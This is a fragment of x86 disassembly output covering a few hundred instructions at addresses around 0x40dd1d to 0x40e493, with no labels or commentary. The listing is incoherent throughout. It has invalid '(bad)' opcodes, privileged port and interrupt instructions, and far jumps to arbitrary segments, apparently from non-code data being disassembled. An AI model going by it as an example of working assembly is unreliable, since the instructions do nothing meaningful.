  40dd1d:	inc    edx
  40dd1e:	and    al,0x15
  40dd20:	pop    ds
  40dd21:	push   eax
  40dd22:	loop   0x40dcbf
  40dd24:	cld    
  40dd25:	mov    DWORD PTR [esi],esp
  40dd27:	jns    0x40dcca
  40dd29:	fdivr  DWORD PTR [ecx-0x2a187442]
  40dd2f:	jo     0x40dd05
  40dd31:	xor    eax,0x419235e2
  40dd36:	jmp    edi
  40dd38:	mov    ds:0xc58baf59,al
  40dd3d:	sub    eax,0x4a25f7b
  40dd42:	ja     0x40dd2d
  40dd44:	stos   DWORD PTR es:[edi],eax
  40dd45:	xchg   edx,eax
  40dd46:	inc    edi
  40dd47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd48:	shr    DWORD PTR [esi-0x19],cl
  40dd4b:	mov    ch,0x4f
  40dd4d:	add    bh,BYTE PTR [ebx-0x10]
  40dd50:	mov    ah,0x3
  40dd52:	push   edx
  40dd53:	nop
  40dd54:	test   eax,0x67437d86
  40dd59:	mov    esi,0x767c2c7d
  40dd5e:	inc    edi
  40dd5f:	hlt    
  40dd60:	lods   eax,DWORD PTR ds:[esi]
  40dd61:	out    0x3e,eax
  40dd63:	aaa    
  40dd64:	dec    esi
  40dd65:	bound  ebx,QWORD PTR ds:0xb028248a
  40dd6b:	je     0x40ddd9
  40dd6d:	jl     0x40dd42
  40dd6f:	xchg   edx,eax
  40dd70:	mov    cl,0xa5
  40dd73:	sbb    DWORD PTR [ebx+esi*1],esi
  40dd76:	ja     0x40dd1f
  40dd78:	adc    al,0xb0
  40dd7a:	mov    ebx,DWORD PTR [ebp-0x1e]
  40dd7d:	pushf  
  40dd7e:	xchg   edi,eax
  40dd7f:	aam    0xf7
  40dd81:	xor    edx,ecx
  40dd83:	adc    DWORD PTR [esi+0x6b3abb73],edi
  40dd89:	das    
  40dd8a:	and    eax,0x2be827aa
  40dd8f:	lock test eax,0xf91898ac
  40dd95:	or     al,0xa1
  40dd97:	dec    edi
  40dd98:	jmp    0x9c79:0xa3997be4
  40dd9f:	mov    esp,0xbb70ac24
  40dda4:	add    eax,0xa096d863
  40dda9:	sbb    ebx,DWORD PTR [edi-0x19]
  40ddac:	fsubr  QWORD PTR [ecx+0x5b3c215f]
  40ddb2:	dec    DWORD PTR [ebx-0xf]
  40ddb5:	aas    
  40ddb6:	or     al,0xbf
  40ddb8:	dec    ebx
  40ddb9:	adc    BYTE PTR [esi],dl
  40ddbb:	sbb    edi,esp
  40ddbd:	loop   0x40de1b
  40ddbf:	mov    dl,0x72
  40ddc1:	pushf  
  40ddc2:	loop   0x40ddf4
  40ddc4:	push   ds
  40ddc5:	repz aam 0x97
  40ddc8:	into   
  40ddc9:	inc    edi
  40ddca:	jbe    0x40dde6
  40ddcc:	das    
  40ddcd:	iret   
  40ddce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddcf:	fst    st(3)
  40ddd1:	cmp    edi,DWORD PTR [ecx-0x3f]
  40ddd4:	repz push eax
  40ddd6:	pop    esi
  40ddd7:	mov    ah,0xe4
  40ddd9:	mov    DWORD PTR ds:0x578e15a1,ebx
  40dddf:	xor    eax,0x972a5951
  40dde4:	test   al,0xc6
  40dde6:	fwait
  40dde7:	in     al,dx
  40dde8:	test   BYTE PTR [eax-0x6434d6f5],0xf0
  40ddef:	mov    bl,0xe5
  40ddf1:	or     al,BYTE PTR [ebp-0x24]
  40ddf4:	xor    eax,0x3e1bcd76
  40ddf9:	push   ecx
  40ddfa:	mov    dl,0xdd
  40ddfc:	sbb    bl,BYTE PTR [edi+0x57401b81]
  40de02:	mov    eax,0xf186b0cc
  40de07:	clc    
  40de08:	cmc    
  40de09:	fadd   st(5),st
  40de0b:	push   ebp
  40de0c:	add    BYTE PTR [ebp-0x696b76d3],0x6c
  40de13:	lods   al,BYTE PTR ds:[esi]
  40de14:	cli    
  40de15:	pop    ebx
  40de16:	(bad)  
  40de17:	mov    ds:0x3e1eb90,al
  40de1c:	mov    ebx,0x56bac380
  40de21:	push   ss
  40de22:	cdq    
  40de23:	inc    esi
  40de24:	arpl   WORD PTR [esi-0x75a840a2],di
  40de2a:	lods   eax,DWORD PTR ds:[esi]
  40de2b:	cs mov bl,0x24
  40de2e:	and    al,0xab
  40de30:	stc    
  40de31:	out    0x7c,al
  40de33:	push   ebp
  40de34:	cmp    ebx,ecx
  40de36:	data16 fdivr DWORD PTR [eax-0x5e4d8696]
  40de3d:	xchg   DWORD PTR [edx-0x3b],esp
  40de40:	stos   DWORD PTR es:[edi],eax
  40de41:	pop    esp
  40de42:	je     0x40de74
  40de44:	shr    ah,1
  40de46:	xor    DWORD PTR ds:0x737e0c5b,0x1ef2c53f
  40de50:	inc    esi
  40de51:	dec    eax
  40de52:	adc    ecx,DWORD PTR [edx-0x20bfd22c]
  40de58:	nop
  40de59:	(bad)  [eax+0x74]
  40de5c:	dec    ebx
  40de5d:	ds into 
  40de5f:	sub    dh,dl
  40de61:	mov    bh,0x2c
  40de63:	jno    0x40de95
  40de65:	xchg   dl,ah
  40de67:	push   esi
  40de68:	fiadd  DWORD PTR [eax]
  40de6a:	fnclex 
  40de6c:	popa   
  40de6d:	aam    0xf4
  40de6f:	jge    0x40ddf9
  40de71:	cmp    DWORD PTR [edx+eax*8+0x5f],edx
  40de75:	stos   BYTE PTR es:[edi],al
  40de76:	mov    ebp,0x9b37dce3
  40de7b:	inc    ecx
  40de7c:	out    0x60,al
  40de7e:	jp     0x40de6a
  40de80:	ins    DWORD PTR es:[edi],dx
  40de81:	xchg   edx,eax
  40de82:	pop    DWORD PTR [edi-0x7fcb117]
  40de88:	lds    ebx,FWORD PTR [ebp+0x4d]
  40de8b:	add    al,0x1
  40de8d:	adc    al,0xc1
  40de8f:	xlat   BYTE PTR ds:[ebx]
  40de90:	es add ebp,esi
  40de93:	inc    ebx
  40de94:	mov    eax,0x1a319bf9
  40de99:	add    eax,DWORD PTR [esi]
  40de9b:	jg     0x40de8e
  40de9d:	xchg   edi,eax
  40de9e:	int3   
  40de9f:	push   es
  40dea0:	loop   0x40dedd
  40dea2:	xchg   ebx,eax
  40dea3:	adc    al,0xb
  40dea5:	inc    edx
  40dea6:	imul   esp,DWORD PTR [edi+edi*4-0x6302c443],0x176e7533
  40deb1:	mov    edx,0x8e25fa6b
  40deb6:	nop
  40deb7:	inc    ebp
  40deb8:	mov    edi,DWORD PTR [esi-0x78cf0915]
  40debe:	call   0x7cf:0xd27368aa
  40dec5:	aaa    
  40dec6:	bound  eax,QWORD PTR [ebx+0x55571af1]
  40decc:	outs   dx,DWORD PTR ds:[esi]
  40decd:	call   0x449d:0xd10888bc
  40ded4:	jo     0x40df25
  40ded6:	lea    ecx,[edx+eax*8-0x2c]
  40deda:	shl    DWORD PTR [edi+0x3f72ca7c],cl
  40dee0:	pop    edx
  40dee1:	dec    ebp
  40dee2:	(bad)
  40dee5:	jnp    0x40df64
  40dee7:	sbb    al,0xcd
  40dee9:	pop    ss
  40deea:	and    ah,dl
  40deec:	adc    BYTE PTR [esi-0x4e],0x94
  40def0:	and    eax,0x4a434ef6
  40def5:	adc    al,ah
  40def7:	xor    al,0x36
  40def9:	or     DWORD PTR [esi+0x2c96b85f],ebp
  40deff:	adc    eax,0xa846f066
  40df04:	jp     0x40df81
  40df06:	xchg   ebp,eax
  40df07:	fsubr  QWORD PTR [eax-0x5fe2f612]
  40df0d:	xchg   BYTE PTR [eax-0x49],dl
  40df10:	pop    ss
  40df11:	inc    edi
  40df12:	pop    esi
  40df13:	pop    edx
  40df14:	adc    ch,BYTE PTR [eax]
  40df16:	push   es
  40df17:	inc    edi
  40df18:	mov    eax,ds:0xa422c60c
  40df1d:	dec    eax
  40df1e:	pop    edi
  40df1f:	gs dec esp
  40df21:	repnz push ds
  40df23:	ins    DWORD PTR es:[edi],dx
  40df24:	inc    ebx
  40df25:	mov    dh,0x6a
  40df27:	ror    BYTE PTR [edi],1
  40df29:	out    dx,al
  40df2a:	call   0x48245439
  40df2f:	push   0xa0145f1b
  40df34:	inc    ebp
  40df35:	push   edx
  40df36:	jbe    0x40def6
  40df38:	(bad)  
  40df39:	adc    esi,ebp
  40df3b:	test   eax,0x6668a5f7
  40df40:	mov    bl,0x84
  40df42:	cmc    
  40df43:	mov    al,0xbd
  40df45:	adc    DWORD PTR [eax+0x9f71b3d],ebp
  40df4b:	jmp    0x40df23
  40df4d:	mov    ds:0x96a6cc72,al
  40df52:	retf   0x4957
  40df55:	mov    ch,0xf4
  40df57:	jle    0x40df5b
  40df59:	stos   DWORD PTR es:[edi],eax
  40df5a:	out    0x5a,eax
  40df5c:	cmc    
  40df5d:	(bad)  
  40df5f:	adc    esi,DWORD PTR [ebp+eax*2+0x4762e8d]
  40df66:	rol    DWORD PTR [esi+0x4c],0xb4
  40df6a:	lock mov dl,cl
  40df6d:	pop    ebp
  40df6e:	push   cs
  40df6f:	fdiv   QWORD PTR [edi+0x44]
  40df72:	shl    BYTE PTR [ecx+0x1d],cl
  40df75:	daa    
  40df76:	inc    edi
  40df77:	inc    ebp
  40df78:	jle    0x40df20
  40df7a:	dec    ecx
  40df7b:	jecxz  0x40df73
  40df7d:	dec    ecx
  40df7e:	jns    0x40df54
  40df80:	outs   dx,DWORD PTR ds:[esi]
  40df81:	sahf   
  40df82:	cmp    BYTE PTR ds:0x200ad7cb,cl
  40df88:	adc    ecx,ebp
  40df8a:	scas   eax,DWORD PTR es:[edi]
  40df8b:	pop    ebx
  40df8c:	jbe    0x40df76
  40df8e:	xor    eax,0x3cf301d5
  40df93:	dec    ebx
  40df94:	mov    ecx,0xab70ed63
  40df99:	inc    ebp
  40df9a:	pop    ds
  40df9b:	sub    eax,0x6e7aee6
  40dfa0:	les    ecx,FWORD PTR [edi]
  40dfa2:	add    DWORD PTR [edx-0x2cc69fe6],0x657026da
  40dfac:	xor    dh,BYTE PTR [ebx-0x17762825]
  40dfb2:	in     eax,dx
  40dfb3:	add    eax,DWORD PTR [edx+0x59a4cd16]
  40dfb9:	add    dh,BYTE PTR [edi+eax*2-0x6c60a87e]
  40dfc0:	fisub  DWORD PTR [eax+0x1dda52d1]
  40dfc6:	jne    0x40dfac
  40dfc8:	imul   esp,DWORD PTR [eax+0x8597dc7],0xcbf76d4b
  40dfd2:	pop    edx
  40dfd3:	sbb    edi,DWORD PTR [eax]
  40dfd5:	retf   0x956e
  40dfd8:	adc    eax,0x2ea2d376
  40dfdd:	fst    DWORD PTR [eax]
  40dfdf:	push   cs
  40dfe0:	push   ss
  40dfe1:	mov    dl,0x45
  40dfe3:	xor    DWORD PTR [edi+0x18bc5d34],ecx
  40dfe9:	fmul   DWORD PTR [edx+ecx*8+0x3f]
  40dfed:	add    DWORD PTR [ebp-0x65896881],ebx
  40dff3:	pop    ebx
  40dff4:	xor    esp,0xffffffce
  40dff7:	mov    ecx,0x93962cf5
  40dffc:	lock arpl WORD PTR gs:[esi+0x1],ax
  40e001:	sub    al,0xac
  40e003:	jge    0x40e005
  40e005:	mov    ds:0x1222c450,al
  40e00a:	test   DWORD PTR [ecx+edi*1+0x56b6d2e4],edx
  40e011:	jns    0x40e077
  40e013:	fimul  DWORD PTR ds:0x91e1d47f
  40e019:	push   cs
  40e01a:	popf   
  40e01b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e01d:	push   edi
  40e01e:	(bad)  
  40e01f:	push   eax
  40e020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e021:	push   0x137e8fb7
  40e026:	imul   ecx,DWORD PTR [ebx+edi*1+0xb],0x673afa2e
  40e02e:	test   BYTE PTR [ecx-0xeb6415d],ch
  40e034:	xor    ah,BYTE PTR [ecx]
  40e036:	lock jg 0x40e099
  40e039:	in     al,dx
  40e03a:	or     bl,al
  40e03c:	xor    DWORD PTR [ebp-0x20d9bfe3],esi
  40e042:	or     bl,BYTE PTR [ebp+0x6de6ff79]
  40e048:	jp     0x40e049
  40e04a:	inc    ecx
  40e04b:	mov    DWORD PTR [edx-0x63],ebp
  40e04e:	in     al,0xf9
  40e050:	jnp    0x40e012
  40e052:	dec    ebx
  40e053:	in     al,0xdf
  40e055:	adc    esp,ebx
  40e057:	aas    
  40e058:	inc    edx
  40e059:	mov    esp,0x4478d991
  40e05e:	pop    esi
  40e05f:	inc    edx
  40e060:	push   0xd0ab129d
  40e065:	rcl    DWORD PTR ds:0xca47ef61,1
  40e06b:	sub    BYTE PTR [ecx+0x76],ch
  40e06e:	ins    DWORD PTR es:[edi],dx
  40e06f:	sbb    eax,0x2ab06bc1
  40e074:	inc    ebp
  40e075:	inc    edx
  40e076:	test   al,0xa4
  40e078:	mov    eax,0x57ec0846
  40e07d:	test   al,0x40
  40e07f:	adc    ah,BYTE PTR [ebp+0x3]
  40e082:	pop    ds
  40e083:	mov    ds:0x1534dd7e,eax
  40e088:	fild   QWORD PTR [eax-0x16]
  40e08b:	test   eax,0x5d4ee8f9
  40e090:	adc    al,0x8
  40e092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e093:	push   esi
  40e094:	xlat   BYTE PTR ds:[ebx]
  40e095:	imul   ebx,DWORD PTR [ecx+ebx*1],0x6f986ae2
  40e09c:	sub    al,0x24
  40e09e:	mov    DWORD PTR [ebx+0x39],edi
  40e0a1:	xor    BYTE PTR [esi],bh
  40e0a3:	pop    ebx
  40e0a4:	iret   
  40e0a5:	in     al,0xce
  40e0a7:	inc    ebx
  40e0a8:	punpckhbw mm1,QWORD PTR [ebp-0x7c44915e]
  40e0af:	jmp    0x45b9bcbe
  40e0b4:	loopne 0x40e059
  40e0b6:	mov    dl,0x6c
  40e0b8:	add    eax,0x6f5dbd73
  40e0bd:	mov    ah,0xf0
  40e0bf:	lds    esp,FWORD PTR [edx+ecx*8+0x67]
  40e0c3:	and    eax,0x48037f41
  40e0c8:	inc    esi
  40e0c9:	(bad)  
  40e0cb:	xchg   edi,eax
  40e0cc:	lahf   
  40e0cd:	fld1   
  40e0cf:	mov    ch,0xea
  40e0d1:	cmp    eax,0x8fe43415
  40e0d6:	mov    bh,0x82
  40e0d8:	sub    eax,0x93372c6
  40e0dd:	sub    ch,dh
  40e0df:	mov    edi,?
  40e0e1:	push   ebp
  40e0e2:	pop    ebp
  40e0e3:	out    dx,al
  40e0e4:	sbb    ch,dl
  40e0e6:	or     BYTE PTR [ebp-0x30],0x2c
  40e0ea:	jns    0x40e0bc
  40e0ec:	lods   eax,DWORD PTR ds:[esi]
  40e0ed:	pop    ebx
  40e0ee:	or     BYTE PTR [ecx+0x4dbeb969],bl
  40e0f4:	pop    esi
  40e0f5:	pushf  
  40e0f6:	scas   eax,DWORD PTR es:[edi]
  40e0f7:	xor    dl,BYTE PTR [ecx-0x70]
  40e0fa:	retf   0x4e30
  40e0fd:	push   0xfffffff1
  40e0ff:	fiadd  DWORD PTR [edx+edi*1+0x72]
  40e103:	cli    
  40e104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e105:	imul   ecx,DWORD PTR [esi-0x406ee911],0x76
  40e10c:	sub    ch,BYTE PTR ds:0xc184607f
  40e112:	push   edi
  40e113:	sub    DWORD PTR [ecx-0x71],esi
  40e116:	mov    eax,ds:0x66757c20
  40e11b:	sub    ch,BYTE PTR [eax-0x7]
  40e11e:	or     ch,BYTE PTR [esi+esi*8+0x3c14c43f]
  40e125:	ficom  DWORD PTR [edx]
  40e127:	or     al,0xf5
  40e129:	es xchg edi,eax
  40e12b:	imul   eax,DWORD PTR ds:0xf26949bc,0xa0c81ccf
  40e135:	push   ss
  40e136:	sbb    al,0x8a
  40e138:	or     BYTE PTR [esi-0xe],ah
  40e13b:	jne    0x40e167
  40e13d:	or     BYTE PTR [ecx+0x34355c29],bl
  40e143:	imul   ebx,DWORD PTR [edx-0x15],0x39
  40e147:	icebp  
  40e148:	out    dx,eax
  40e149:	test   BYTE PTR [ebx+0x2c5be852],dl
  40e14f:	ret    
  40e150:	cs aas 
  40e152:	clc    
  40e153:	sbb    al,0xf9
  40e155:	dec    esi
  40e156:	sbb    al,0xc2
  40e158:	and    BYTE PTR [edi],0xf4
  40e15b:	push   cs
  40e15c:	add    ch,0xb1
  40e15f:	pop    esi
  40e160:	push   edi
  40e161:	dec    esi
  40e162:	idiv   dh
  40e164:	fidivr DWORD PTR [esp+eiz*2]
  40e167:	jo     0x40e166
  40e169:	imul   esi,DWORD PTR [eax+0x68f7cf20],0x29
  40e170:	inc    ebp
  40e171:	ficom  DWORD PTR [esp+eiz*8-0x4c]
  40e175:	out    dx,eax
  40e176:	pop    esi
  40e177:	call   0xe437:0x4c602cfc
  40e17e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e17f:	and    dl,BYTE PTR [eax-0x71]
  40e182:	(bad)  
  40e184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e185:	jle    0x40e1ac
  40e187:	mov    al,0xa8
  40e189:	stos   DWORD PTR es:[edi],eax
  40e18a:	cmp    BYTE PTR [ecx-0x31e3cb5e],ch
  40e190:	test   BYTE PTR [edx-0x77],al
  40e193:	and    al,0xe9
  40e195:	cmp    eax,0x3adeabbd
  40e19a:	xchg   esi,eax
  40e19b:	mov    bh,0x87
  40e19d:	adc    DWORD PTR [edi-0x8],esi
  40e1a0:	retf   
  40e1a1:	adc    al,0x24
  40e1a3:	xchg   ecx,eax
  40e1a4:	ret    0x76b1
  40e1a7:	in     al,dx
  40e1a8:	mov    ah,0x99
  40e1aa:	xchg   ecx,eax
  40e1ab:	xchg   ecx,eax
  40e1ac:	(bad)  
  40e1ad:	repnz (bad) 
  40e1af:	jae    0x40e1cf
  40e1b1:	or     al,BYTE PTR [edx-0x17]
  40e1b4:	add    dh,dh
  40e1b6:	mov    dh,0xd2
  40e1b8:	xchg   ebp,eax
  40e1b9:	lods   al,BYTE PTR ss:[esi]
  40e1bb:	mov    BYTE PTR ds:0xf9ec8d9f,dh
  40e1c1:	add    dh,BYTE PTR [eax]
  40e1c3:	out    0x71,eax
  40e1c5:	(bad)  
  40e1c6:	lahf   
  40e1c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1c8:	inc    esi
  40e1c9:	add    cl,BYTE PTR [edi]
  40e1cb:	mov    bh,BYTE PTR [eax-0x1b]
  40e1ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1cf:	mul    eax
  40e1d1:	pop    ebp
  40e1d2:	dec    esi
  40e1d3:	mov    ah,0x61
  40e1d5:	retf   0x4e36
  40e1d8:	fcmovne st,st(0)
  40e1da:	pushf  
  40e1db:	iret   
  40e1dc:	cmc    
  40e1dd:	jge    0x40e1df
  40e1df:	call   0xd646:0x9a4644bb
  40e1e6:	xor    ebx,DWORD PTR [edx+0x3597cafb]
  40e1ec:	xchg   ecx,eax
  40e1ed:	jecxz  0x40e1d0
  40e1ef:	pusha  
  40e1f0:	sbb    DWORD PTR [edi],esi
  40e1f2:	mov    DWORD PTR [edi+0x12d1127f],esp
  40e1f8:	xchg   ebx,eax
  40e1f9:	(bad)  
  40e1fa:	xor    DWORD PTR ds:0xbd5e4510,edi
  40e200:	sbb    al,0xa3
  40e202:	pop    edx
  40e203:	test   BYTE PTR [edi+0x3b],bl
  40e206:	cmp    DWORD PTR [eax],0xffffffa1
  40e209:	xchg   edi,eax
  40e20a:	lods   eax,DWORD PTR ds:[esi]
  40e20b:	stos   BYTE PTR es:[edi],al
  40e20c:	loop   0x40e1a7
  40e20e:	cmp    al,0x54
  40e210:	loop   0x40e246
  40e212:	pop    es
  40e213:	mov    ecx,0xadd783c0
  40e218:	jnp    0x40e1ec
  40e21a:	ds loop 0x40e1d7
  40e21d:	xor    eax,0x78a0f91a
  40e222:	sub    al,0xa5
  40e224:	mov    esp,0x3eed7fd8
  40e229:	out    dx,eax
  40e22a:	xchg   ebp,eax
  40e22b:	and    esi,ebx
  40e22d:	lock dec edi
  40e22f:	sub    bh,BYTE PTR [edi-0x56]
  40e232:	sub    eax,0xc6fb795c
  40e237:	fcom   QWORD PTR ds:0xce895691
  40e23d:	sbb    al,0x45
  40e23f:	outs   dx,DWORD PTR ds:[esi]
  40e240:	and    eax,0xf2f55157
  40e245:	aas    
  40e246:	aad    0x60
  40e248:	mov    cl,0x5f
  40e24a:	xchg   edi,eax
  40e24b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e24c:	or     ebp,DWORD PTR [edx-0x38cd5715]
  40e252:	sar    BYTE PTR [ebx-0x46ff6557],0x2c
  40e259:	ret    
  40e25a:	push   ebx
  40e25b:	cli    
  40e25c:	mov    bh,0x7
  40e25e:	repz xor ah,al
  40e261:	ret    0xf40f
  40e264:	mov    WORD PTR [edi+0x72f94f4e],ds
  40e26a:	or     al,dh
  40e26c:	ds pop esp
  40e26e:	push   edx
  40e26f:	inc    edi
  40e270:	dec    esp
  40e271:	aas    
  40e272:	xor    eax,0x198839c8
  40e277:	sub    al,0xa8
  40e279:	push   ebp
  40e27a:	pushf  
  40e27b:	lahf   
  40e27c:	jnp    0x40e2f8
  40e27e:	cmp    eax,0xe7e88308
  40e283:	jae    0x40e2bc
  40e285:	fist   DWORD PTR [ebx+0x3c]
  40e288:	or     al,0x6
  40e28a:	ds jp  0x40e238
  40e28d:	lock adc eax,0x814976b2
  40e293:	mov    eax,DWORD PTR [edi-0x3b]
  40e296:	mov    bl,0x69
  40e298:	loop   0x40e2e5
  40e29a:	mul    DWORD PTR [ebp-0x5a]
  40e29d:	mov    ebx,?
  40e29f:	dec    edi
  40e2a0:	ret    0xae79
  40e2a3:	mov    bh,0xae
  40e2a5:	sub    DWORD PTR [edi-0x24],ecx
  40e2a8:	xor    al,0xe2
  40e2aa:	into   
  40e2ab:	dec    esi
  40e2ac:	sub    edx,esp
  40e2ae:	int    0x82
  40e2b0:	sbb    eax,0xf9b32ea5
  40e2b5:	jg     0x40e2ab
  40e2b7:	xchg   ebp,eax
  40e2b8:	jge    0x40e301
  40e2ba:	popa   
  40e2bb:	fnstcw WORD PTR [ebx-0x4a]
  40e2be:	imul   ebx,DWORD PTR [edx-0x36],0xfffffff7
  40e2c2:	ins    DWORD PTR es:[edi],dx
  40e2c3:	lods   eax,DWORD PTR ds:[esi]
  40e2c4:	pop    edx
  40e2c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2c7:	adc    BYTE PTR [eax-0x67],0x37
  40e2cb:	out    dx,eax
  40e2cc:	shl    DWORD PTR [edi],1
  40e2ce:	dec    ecx
  40e2cf:	aas    
  40e2d0:	fstp   QWORD PTR [ecx+0x60fd2798]
  40e2d6:	jb     0x40e2ec
  40e2d8:	popa   
  40e2d9:	and    ecx,DWORD PTR [ebp-0x5f42aa6]
  40e2df:	sbb    al,0xc3
  40e2e1:	push   ecx
  40e2e2:	jmp    0xdde6:0xbdfea926
  40e2e9:	jno    0x40e26f
  40e2eb:	mov    dh,0x63
  40e2ed:	push   0xdad54434
  40e2f2:	mov    bh,0xf8
  40e2f4:	shl    DWORD PTR [edx+0xa827088],0x6d
  40e2fb:	xchg   esi,eax
  40e2fc:	xchg   ebx,eax
  40e2fd:	adc    eax,DWORD PTR [ebx]
  40e2ff:	mov    al,0x3c
  40e301:	cwde   
  40e302:	push   0x4b
  40e304:	xor    eax,0x3e12bb4c
  40e309:	pop    ebp
  40e30a:	xor    ah,BYTE PTR [ebx+0x4b]
  40e30d:	cmp    eax,0x454e8548
  40e312:	stc    
  40e313:	sub    BYTE PTR [ecx-0x48],bl
  40e316:	xchg   esi,eax
  40e317:	jno    0x40e2ef
  40e319:	cmp    ebp,DWORD PTR [eax+0x4f]
  40e31c:	sbb    BYTE PTR [ebx+0x36],ah
  40e31f:	addr16 int3 
  40e321:	sub    esp,DWORD PTR [esp+edx*4-0x2]
  40e325:	test   al,0x88
  40e327:	imul   eax,DWORD PTR [eax],0xc58c4642
  40e32d:	jle    0x40e364
  40e32f:	stos   BYTE PTR es:[edi],al
  40e330:	inc    edi
  40e331:	inc    edx
  40e332:	add    al,BYTE PTR [edx]
  40e334:	rcl    edi,1
  40e336:	jno    0x40e33c
  40e338:	out    dx,al
  40e339:	bound  esp,QWORD PTR [ebp-0x60]
  40e33c:	add    BYTE PTR [ebx],0x9e
  40e33f:	sti    
  40e340:	rcr    al,cl
  40e342:	pusha  
  40e343:	leave  
  40e344:	add    ebp,DWORD PTR ds:0xe24db5de
  40e34a:	in     al,0x1
  40e34c:	fsubr  DWORD PTR [ebx+eax*2-0x7e14cf77]
  40e353:	mov    WORD PTR [eax+eax*4],?
  40e356:	scas   eax,DWORD PTR es:[edi]
  40e357:	cdq    
  40e358:	add    DWORD PTR [edi+0x27],esp
  40e35b:	push   ss
  40e35c:	out    0xd0,eax
  40e35e:	in     al,0x23
  40e360:	sbb    DWORD PTR [eax+0x52],ebp
  40e363:	out    0xb4,al
  40e365:	daa    
  40e366:	and    edx,edx
  40e368:	sahf   
  40e369:	leave  
  40e36a:	push   0x39de5840
  40e36f:	fstp   QWORD PTR [edx-0x27d61b05]
  40e375:	nop
  40e376:	fmul   st,st(3)
  40e378:	inc    ebp
  40e379:	jne    0x40e394
  40e37b:	(bad)  
  40e37c:	in     al,0x2f
  40e37e:	inc    ebp
  40e37f:	jnp    0x40e317
  40e381:	aad    0x56
  40e383:	in     eax,dx
  40e384:	outs   dx,DWORD PTR ds:[esi]
  40e385:	pushf  
  40e386:	sahf   
  40e387:	aas    
  40e388:	ror    BYTE PTR [edi+0x57],0xf2
  40e38c:	ss dec eax
  40e38e:	xchg   ecx,eax
  40e38f:	(bad)  
  40e390:	call   0x6d16:0xb9eb543d
  40e397:	jl     0x40e380
  40e399:	xor    ecx,eax
  40e39b:	imul   ebx,DWORD PTR [eiz*2+0x79e0b12e],0x3ff2076
  40e3a6:	lds    esp,FWORD PTR ds:0x35d524ed
  40e3ac:	or     al,0x4f
  40e3ae:	js     0x40e37e
  40e3b0:	iret   
  40e3b1:	stc    
  40e3b2:	and    DWORD PTR [eax-0x19],eax
  40e3b5:	enter  0xba48,0x87
  40e3b9:	or     al,0x5
  40e3bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3bc:	xchg   edx,eax
  40e3bd:	fs adc eax,0xe27197b6
  40e3c3:	adc    al,0xf0
  40e3c5:	popf   
  40e3c6:	out    dx,al
  40e3c7:	bound  ebx,QWORD PTR [esp+eax*1-0x29]
  40e3cb:	fcom   QWORD PTR [edx-0x1022631e]
  40e3d1:	sahf   
  40e3d2:	addr16 xchg ebx,eax
  40e3d4:	nop
  40e3d5:	jnp    0x40e35f
  40e3d7:	arpl   WORD PTR [ebx],si
  40e3d9:	sahf   
  40e3da:	outs   dx,DWORD PTR ds:[esi]
  40e3db:	jecxz  0x40e396
  40e3dd:	cli    
  40e3de:	lods   eax,DWORD PTR ds:[esi]
  40e3df:	push   0xe18ef5e6
  40e3e4:	lahf   
  40e3e5:	ins    BYTE PTR es:[edi],dx
  40e3e6:	pop    ebp
  40e3e7:	int3   
  40e3e8:	xchg   ebp,eax
  40e3e9:	pop    edx
  40e3ea:	sub    BYTE PTR [ebx-0x3605197b],al
  40e3f0:	repnz adc DWORD PTR [ebx],0xffffff89
  40e3f4:	in     al,0x2c
  40e3f6:	mov    ebx,0x9e03f8c4
  40e3fb:	test   al,0x6
  40e3fd:	imul   esp,ebx,0x45
  40e400:	jmp    0x6ab:0x7a06794c
  40e407:	rol    edi,1
  40e409:	and    al,0x87
  40e40b:	push   ecx
  40e40c:	mov    ch,0xd6
  40e40e:	sub    ebx,esi
  40e410:	sbb    eax,0xdc9ad21
  40e415:	xchg   DWORD PTR ds:0x2c364748,edx
  40e41b:	xchg   ecx,eax
  40e41c:	mov    ebx,DWORD PTR [ebx+0x4d]
  40e41f:	lock mov al,ds:0x7c93ee6a
  40e425:	push   ss
  40e426:	nop
  40e427:	xchg   ebp,eax
  40e428:	lods   eax,DWORD PTR ds:[esi]
  40e429:	lea    esi,[ebx+0x168cfccd]
  40e42f:	fild   QWORD PTR [esi-0x15]
  40e432:	add    eax,0x5b54415d
  40e437:	rol    dl,cl
  40e439:	dec    eax
  40e43a:	retf   
  40e43b:	fnstenv [esi+0x2]
  40e43e:	ret    0xab4b
  40e441:	xor    eax,0x145bc1e2
  40e446:	in     al,dx
  40e447:	or     esi,DWORD PTR [eax-0x78a35e53]
  40e44d:	xchg   BYTE PTR ds:0x209cc86,al
  40e453:	xchg   esi,eax
  40e454:	dec    ebx
  40e455:	mov    ?,WORD PTR [edx+eiz*1+0x7b88c465]
  40e45c:	inc    edx
  40e45d:	mov    bh,0x34
  40e45f:	lock fs (bad) 
  40e462:	lea    edi,[esp+ebx*4]
  40e465:	mov    al,ds:0xce39c291
  40e46a:	in     al,dx
  40e46b:	pop    esp
  40e46c:	ret    
  40e46d:	pop    esp
  40e46e:	pushf  
  40e46f:	adc    ebp,0xffffff91
  40e472:	add    ecx,ecx
  40e474:	inc    ebp
  40e475:	je     0x40e416
  40e477:	sub    eax,DWORD PTR [ebx-0x20]
  40e47a:	sub    BYTE PTR [eax-0x4e],al
  40e47d:	lods   al,BYTE PTR ds:[esi]
  40e47e:	pop    ss
  40e47f:	mov    ds:0x48315281,eax
  40e484:	xchg   ebx,eax
  40e485:	movd   mm0,DWORD PTR [esi-0x56]
  40e489:	les    edi,FWORD PTR [edi]
  40e48b:	(bad)  
  40e48c:	outs   dx,BYTE PTR ds:[esi]
  40e48d:	cli    
  40e48e:	shr    dl,1
  40e490:	aaa    
  40e491:	xchg   esp,eax
  40e492:	pop    edx
  40e493:	mov    bh,0xd7
